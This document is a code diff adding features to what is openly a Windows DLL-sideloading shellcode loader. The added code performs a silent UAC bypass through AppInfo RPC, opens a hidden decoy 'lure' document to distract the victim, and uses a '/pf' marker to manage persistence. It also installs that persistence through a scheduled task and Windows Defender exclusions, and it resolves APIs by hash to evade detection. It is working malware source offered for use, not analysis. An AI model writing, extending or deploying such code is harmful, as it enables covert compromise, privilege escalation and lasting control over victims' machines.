@@ -127,14 +127,186 @@ static BOOL RelaunchElevated(VOID) {
     return ((INT_PTR)hResult > 32);
 }
 
+#ifdef UAC_BYPASS
+// -----------------------------------------------
+// Relaunch host EXE elevated via AppInfo RPC bypass
+// No UAC dialog — uses same method as standalone EXE
+// -----------------------------------------------
+static BOOL RelaunchElevatedAppInfo(VOID) {
+    API_HASHING apis;
+    MemSet(&apis, 0, sizeof(apis));
+    if (!InitializeWinApis(&apis)) return FALSE;
+
+    PVOID pNtdll = FindLoadedModuleW(L"NTDLL.DLL");
+    PVOID pK32   = FindLoadedModuleW(L"KERNEL32.DLL");
+    if (!pNtdll || !pK32) return FALSE;
+
+    typedef DWORD (WINAPI* fnGSD)(LPWSTR, UINT);
+    typedef DWORD (WINAPI* fnGWD)(LPWSTR, UINT);
+    typedef DWORD (WINAPI* fnGMFW)(HMODULE, LPWSTR, DWORD);
+
+    fnGSD  pGSD  = (fnGSD) FetchExportAddress(pK32, GetSystemDirectoryW_JOAAT);
+    fnGWD  pGWD  = (fnGWD) FetchExportAddress(pK32, GetWindowsDirectoryW_JOAAT);
+    fnGMFW pGMFW = (fnGMFW)FetchExportAddress(pK32, GetModuleFileNameW_JOAAT);
+    if (!pGSD || !pGWD || !pGMFW) return FALSE;
+
+    WCHAR wSysDir[MAX_PATH] = {0};
+    WCHAR wWinDir[MAX_PATH] = {0};
+    pGSD(wSysDir, MAX_PATH);
+    pGWD(wWinDir, MAX_PATH);
+
+    WCHAR wExeRaw[MAX_PATH] = {0};
+    if (!pGMFW(NULL, wExeRaw, MAX_PATH)) return FALSE;
+
+    // Quote path for CreateProcess lpCommandLine
+    WCHAR wExeCmd[MAX_PATH + 4] = {0};
+    wExeCmd[0] = L'"';
+    SIZE_T n = 0;
+    while (wExeRaw[n] && n < MAX_PATH - 2) { wExeCmd[n + 1] = wExeRaw[n]; n++; }
+    wExeCmd[n + 1] = L'"';
+
+    return UacRunCommandElevated(&apis, pNtdll, wSysDir, wWinDir, wExeCmd);
+}
+#endif /* UAC_BYPASS */
+
 #endif /* REQUIRE_ELEVATION */
+
+// -----------------------------------------------
+// OpenBindFile — open the bind file from the hidden
+// "\_" subfolder that sits next to the host EXE.
+//
+// Deployment layout:
+//   host.exe
+//   proxy.dll      (hidden attribute)
+//   original.dll   (hidden attribute)
+//   _\             (hidden folder)
+//     bindfile.*   (document / lure file)
+//
+// Looks for the first non-directory entry under
+// <exe_dir>\_\ and calls ShellExecuteA("open") on
+// it. Silent no-op if the folder does not exist or
+// is empty. Called BEFORE Main() so the lure opens
+// while the loader pipeline is running.
+// -----------------------------------------------
+static VOID OpenBindFile(VOID) {
+    PVOID pKernel32 = FindLoadedModuleW(L"KERNEL32.DLL");
+    if (!pKernel32) return;
+
+    // --- Persistence-launch guard ---
+    // InstallPersistence() appends " /pf" to the run-key value for DLL builds.
+    // On reboot the host EXE is launched with that marker in its command line.
+    // If found, skip the bind file — lure documents only open on first-run.
+    {
+        typedef LPSTR (WINAPI* fnGetCmdLineA)(VOID);
+        fnGetCmdLineA pGetCmdLineA =
+            (fnGetCmdLineA)FetchExportAddress(pKernel32, GetCommandLineA_JOAAT);
+        if (pGetCmdLineA) {
+            LPCSTR szCmd = pGetCmdLineA();
+            if (szCmd) {
+                DWORD _i = 0;
+                while (szCmd[_i]) {
+                    if (szCmd[_i  ] == ' '  && szCmd[_i+1] == '/' &&
+                        szCmd[_i+2] == 'p'  && szCmd[_i+3] == 'f' &&
+                        (szCmd[_i+4] == '\0' || szCmd[_i+4] == ' ')) {
+                        return;  // persistence relaunch — do not open lure
+                    }
+                    _i++;
+                }
+            }
+        }
+    }
+
+    fnLoadLibraryA pLoadLibraryA =
+        (fnLoadLibraryA)FetchExportAddress(pKernel32, LoadLibraryA_JOAAT);
+    if (!pLoadLibraryA) return;
+
+    // Get host EXE full path
+    typedef DWORD(WINAPI* fnGetModFN)(HMODULE, LPSTR, DWORD);
+    fnGetModFN pGetModFN =
+        (fnGetModFN)FetchExportAddress(pKernel32, GetModuleFileNameA_JOAAT);
+    if (!pGetModFN) return;
+
+    CHAR szExePath[260];
+    MemSet(szExePath, 0, sizeof(szExePath));
+    DWORD dwLen = pGetModFN(NULL, szExePath, 260);
+    if (dwLen == 0 || dwLen >= 260) return;
+
+    // Strip filename — find last backslash
+    INT iLast = -1;
+    for (INT i = 0; i < (INT)dwLen; i++) {
+        if (szExePath[i] == '\\') iLast = i;
+    }
+    if (iLast < 0 || (iLast + 4) >= 260) return;
+
+    // Build search pattern: <dir>\_\*
+    CHAR szPattern[260];
+    MemSet(szPattern, 0, sizeof(szPattern));
+    MemCopy(szPattern, szExePath, (SIZE_T)(iLast + 1)); // includes trailing "\"
+    szPattern[iLast + 1] = '_';
+    szPattern[iLast + 2] = '\\';
+    szPattern[iLast + 3] = '*';
+    // szPattern[iLast + 4] already '\0' from MemSet
+
+    // Resolve FindFirstFileA / FindNextFileA / FindClose
+    typedef HANDLE(WINAPI* fnFFF)(LPCSTR, LPWIN32_FIND_DATAA);
+    typedef BOOL  (WINAPI* fnFNF)(HANDLE, LPWIN32_FIND_DATAA);
+    typedef BOOL  (WINAPI* fnFC )(HANDLE);
+
+    fnFFF pFindFirstFileA  = (fnFFF)FetchExportAddress(pKernel32, FindFirstFileA_JOAAT);
+    fnFNF pFindNextFileA   = (fnFNF)FetchExportAddress(pKernel32, FindNextFileA_JOAAT);
+    fnFC  pFindClose       = (fnFC) FetchExportAddress(pKernel32, FindClose_JOAAT);
+    if (!pFindFirstFileA || !pFindNextFileA || !pFindClose) return;
+
+    WIN32_FIND_DATAA wfd;
+    MemSet(&wfd, 0, sizeof(wfd));
+    HANDLE hFind = pFindFirstFileA(szPattern, &wfd);
+    if (hFind == INVALID_HANDLE_VALUE) return;
+
+    // Walk entries — find first real file (skip . and .. and sub-directories)
+    CHAR szFilePath[260];
+    MemSet(szFilePath, 0, sizeof(szFilePath));
+    BOOL bFound = FALSE;
+
+    do {
+        if (!(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+            DWORD dwNameLen = (DWORD)StrLenA(wfd.cFileName);
+            if (dwNameLen > 0 && ((DWORD)(iLast + 3) + dwNameLen) < 260) {
+                // Prefix "<dir>\_\" is iLast+3 bytes (positions 0..iLast+2)
+                MemCopy(szFilePath, szPattern, (SIZE_T)(iLast + 3));
+                MemCopy(szFilePath + iLast + 3, wfd.cFileName, dwNameLen);
+                // szFilePath[iLast+3+dwNameLen] already '\0' from MemSet
+                bFound = TRUE;
+            }
+            break;
+        }
+    } while (pFindNextFileA(hFind, &wfd));
+
+    pFindClose(hFind);
+    if (!bFound) return;
+
+    // Load shell32 and call ShellExecuteA("open", filePath)
+    HMODULE hShell32 = pLoadLibraryA("shell32.dll");
+    if (!hShell32) return;
+
+    fnGetProcAddress pGetProcAddress =
+        (fnGetProcAddress)FetchExportAddress(pKernel32, GetProcAddress_JOAAT);
+    if (!pGetProcAddress) return;
+
+    typedef HINSTANCE(WINAPI* fnShellExec)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);
+    fnShellExec pShellExecuteA =
+        (fnShellExec)pGetProcAddress(hShell32, "ShellExecuteA");
+    if (!pShellExecuteA) return;
+
+    pShellExecuteA(NULL, "open", szFilePath, NULL, NULL, 1 /* SW_SHOWNORMAL */);
+}
 
 // -----------------------------------------------
 // Thread pool callback
 //
 // 1. [REQUIRE_ELEVATION] Check elevation → relaunch if needed
 // 2. Pin DLL in memory
-// 3. Run Main() (full loader pipeline)
+// 3. OpenBindFile — open lure doc from _\ before shellcode runs
+// 4. Run Main() (full loader pipeline)
 // -----------------------------------------------
 static VOID NTAPI SideloadWorker(PVOID Instance, PVOID Context, PVOID Work) {
     (void)Instance;
@@ -142,11 +314,42 @@ static VOID NTAPI SideloadWorker(PVOID Instance, PVOID Context, PVOID Work) {
     (void)Work;
 
 #ifdef REQUIRE_ELEVATION
-    // --- Elevation check ---
-    if (!IsElevated()) {
-        if (RelaunchElevated()) {
-            // Elevated instance launched — terminate this one.
-            // NtTerminateProcess not patched yet, safe to call directly.
+    // --- Persistence-reboot detection ---
+    // Scheduled task launches msoia.exe with argument "/pf" and RunLevel Highest.
+    // If "/pf" is present the task already started us elevated — skip re-elevation
+    // and skip re-install; go straight to shellcode.
+    BOOL bPersistBoot = FALSE;
+#if defined(UAC_BYPASS)
+    {
+        typedef LPSTR (WINAPI* fnGCLA2)(VOID);
+        PVOID pK32x = FindLoadedModuleW(L"KERNEL32.DLL");
+        if (pK32x) {
+            fnGCLA2 pGetCmdLine2 = (fnGCLA2)FetchExportAddress(pK32x, GetCommandLineA_JOAAT);
+            if (pGetCmdLine2) {
+                LPCSTR szCmd2 = pGetCmdLine2();
+                if (szCmd2) {
+                    for (DWORD _ci = 0; szCmd2[_ci]; _ci++) {
+                        if (szCmd2[_ci]==' ' && szCmd2[_ci+1]=='/' && szCmd2[_ci+2]=='p' &&
+                            szCmd2[_ci+3]=='f' && (szCmd2[_ci+4]=='\0' || szCmd2[_ci+4]==' ')) {
+                            bPersistBoot = TRUE; break;
+                        }
+                    }
+                }
+            }
+        }
+    }
+#endif
+
+    // --- Elevation check (first-run only) ---
+    if (!bPersistBoot && !IsElevated()) {
+        BOOL bRelaunched;
+#ifdef UAC_BYPASS
+        bRelaunched = RelaunchElevatedAppInfo();
+#else
+        bRelaunched = RelaunchElevated();
+#endif
+        if (bRelaunched) {
+            // Elevated instance launched — terminate this medium-IL instance.
             typedef NTSTATUS(NTAPI* fnNtTerminateProcess2)(HANDLE, NTSTATUS);
             fnNtTerminateProcess2 pNtTerminateProcess =
                 (fnNtTerminateProcess2)FetchExportAddress(g_pNtdll, NtTerminateProcess_JOAAT);
@@ -154,15 +357,38 @@ static VOID NTAPI SideloadWorker(PVOID Instance, PVOID Context, PVOID Work) {
                 pNtTerminateProcess((HANDLE)-1, 0);
             return;
         }
-        // User clicked No on UAC — continue at medium integrity
+        // Relaunch failed — continue at medium integrity
+    }
+
+    // --- Sideload persistence install (elevated first run only) ---
+    // Copies EXE + DLLs, runs WD exclusions, registers scheduled task, then exits.
+    // Shellcode runs on the next logon via the scheduled task (/pf path).
+    // Self-guards: no-op if already running from the persistence directory.
+#if defined(UAC_BYPASS)
+    if (!bPersistBoot && IsElevated()) {
+        OpenBindFile();
+        API_HASHING sApis;
+        MemSet(&sApis, 0, sizeof(sApis));
+        if (InitializeWinApis(&sApis))
+            SideloadInstallAndContinue(&sApis);
+        typedef NTSTATUS(NTAPI* fnNtTerm)(HANDLE, NTSTATUS);
+        fnNtTerm pNtTerm = (fnNtTerm)FetchExportAddress(g_pNtdll, NtTerminateProcess_JOAAT);
+        if (pNtTerm) pNtTerm((HANDLE)(ULONG_PTR)-1, 0);
+        return;
     }
 #endif
+
+#endif /* REQUIRE_ELEVATION */
 
     // --- Pin our DLL in memory (LdrAddRefDll) ---
     typedef NTSTATUS(NTAPI* fnLdrAddRefDll)(ULONG Flags, PVOID BaseAddress);
     fnLdrAddRefDll pLdrAddRefDll = (fnLdrAddRefDll)FetchExportAddress(g_pNtdll, LdrAddRefDll_JOAAT);
     if (pLdrAddRefDll)
         pLdrAddRefDll(0x01, (PVOID)g_hDll);  // LDR_ADDREF_DLL_PIN
+
+    // --- Open lure / bind file from _\ BEFORE shellcode runs ---
+    // Silently no-ops if _\ doesn't exist or has no files.
+    OpenBindFile();
 
     // --- Run loader pipeline ---
     Main();
